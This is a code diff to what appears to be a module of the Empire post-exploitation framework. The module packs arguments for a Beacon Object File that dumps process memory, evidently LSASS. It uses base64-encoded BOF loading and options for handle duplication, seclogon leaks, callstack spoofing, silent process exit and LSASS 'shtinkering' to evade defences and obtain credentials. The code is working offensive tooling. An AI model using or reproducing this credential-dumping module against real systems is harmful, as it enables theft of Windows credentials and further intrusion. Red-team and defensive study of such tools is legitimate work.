@@ -1,5 +1,8 @@
+import base64
+
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils.bof_packer import Packer
 
 
 class Module:
@@ -12,41 +15,59 @@ class Module:
         obfuscation_command: str = "",
         **kwargs,
     ):
-        params_dict = {
-            "Architecture": "x64",
-            "ProcessID": params.get("pid") or "0",
-            "DumpPath": params.get("write", "find_me.dmp"),
-            "WriteFile": "1" if params.get("write") else "0",
-            "Chunksize": params.get("chunksize") or "0",
-            "ValidSignature": "1" if params.get("valid") == "true" else "0",
-            "Fork": "1" if params.get("fork") == "true" else "0",
-            "Snapshot": "1" if params.get("snapshot") == "true" else "0",
-            "DuplicateHandle": "1" if params.get("duplicate") == "true" else "0",
-            "ElevateHandle": "1" if params.get("elevate-handle") == "true" else "0",
-            "DuplicateElevate": (
-                "1" if params.get("duplicate-elevate") == "true" else "0"
-            ),
-            "GetPID": "1" if params.get("getpid") == "true" else "0",
-            "SecLogonLeakLocal": (
-                "1" if params.get("seclogon-leak-local") == "true" else "0"
-            ),
-            "SecLogonLeakRemote": (
-                "1" if params.get("seclogon-leak-remote") == "true" else "0"
-            ),
-            "SecLogonLeakRemoteBinary": (
-                "0" if params.get("seclogon-leak-remote") == "true" else ""
-            ),
-            "SecLogonDuplicate": (
-                "1" if params.get("seclogon-duplicate") == "true" else "0"
-            ),
-            "SpoofCallstack": "1" if params.get("spoof-callstack") == "true" else "0",
-            "SilentProcessExit": "1" if params.get("silent-process-exit") else "0",
-            "SilentProcessExitBinary": params.get("silent-process-exit", ""),
-            "Shtinkering": "1" if params.get("shtinkering") == "true" else "0",
-        }
+        agent_language = kwargs.get("agent_language", "")
 
-        return main_menu.modulesv2.generate_script_bof(
-            module=module,
-            params=params_dict,
+        pid = int(params.get("pid", "0") or "0")
+        dump_path = params.get("write", "")
+        write_file = 1 if dump_path else 0
+        chunk_size = int(params.get("chunksize", "0") or "0")
+        use_valid_sig = 1 if params.get("valid") == "true" else 0
+        fork = 1 if params.get("fork") == "true" else 0
+        snapshot = 1 if params.get("snapshot") == "true" else 0
+        dup = 1 if params.get("duplicate") == "true" else 0
+        elevate_handle = 1 if params.get("elevate-handle") == "true" else 0
+        duplicate_elevate = 1 if params.get("duplicate-elevate") == "true" else 0
+        get_pid = 1 if params.get("getpid") == "true" else 0
+        use_seclogon_leak_local = (
+            1 if params.get("seclogon-leak-local") == "true" else 0
+        )
+        seclogon_leak_remote_binary = params.get("seclogon-leak-remote", "")
+        use_seclogon_leak_remote = 1 if seclogon_leak_remote_binary else 0
+        use_seclogon_duplicate = 1 if params.get("seclogon-duplicate") == "true" else 0
+        spoof_callstack = 1 if params.get("spoof-callstack") == "true" else 0
+        silent_process_exit = params.get("silent-process-exit", "")
+        use_silent_process_exit = 1 if silent_process_exit else 0
+        use_lsass_shtinkering = 1 if params.get("shtinkering") == "true" else 0
+
+        script_path = main_menu.modulesv2.module_source_path / module.bof.x64
+        bof_data = script_path.read_bytes()
+        b64_bof_data = base64.b64encode(bof_data).decode("utf-8")
+
+        # Pack arguments matching CNA bof_pack order: iziiiiiiiiiiiziiizi
+        packer = Packer()
+        packer.addint(pid)  # i - pid
+        packer.addstr(dump_path)  # z - dump_path
+        packer.addint(write_file)  # i - write_file
+        packer.addint(chunk_size)  # i - chunk_size
+        packer.addint(use_valid_sig)  # i - use_valid_sig
+        packer.addint(fork)  # i - fork
+        packer.addint(snapshot)  # i - snapshot
+        packer.addint(dup)  # i - dup (duplicate)
+        packer.addint(elevate_handle)  # i - elevate_handle
+        packer.addint(duplicate_elevate)  # i - duplicate_elevate
+        packer.addint(get_pid)  # i - get_pid
+        packer.addint(use_seclogon_leak_local)  # i - use_seclogon_leak_local
+        packer.addint(use_seclogon_leak_remote)  # i - use_seclogon_leak_remote
+        packer.addstr(seclogon_leak_remote_binary)  # z - seclogon_leak_remote_binary
+        packer.addint(use_seclogon_duplicate)  # i - use_seclogon_duplicate
+        packer.addint(spoof_callstack)  # i - spoof_callstack
+        packer.addint(use_silent_process_exit)  # i - use_silent_process_exit
+        packer.addstr(silent_process_exit)  # z - silent_process_exit
+        packer.addint(use_lsass_shtinkering)  # i - use_lsass_shtinkering
+
+        return main_menu.modulesv2.format_bof_output(
+            bof_data_b64=b64_bof_data,
+            hex_data=packer.getbuffer_data(),
+            agent_language=agent_language,
             obfuscate=obfuscate,
         )
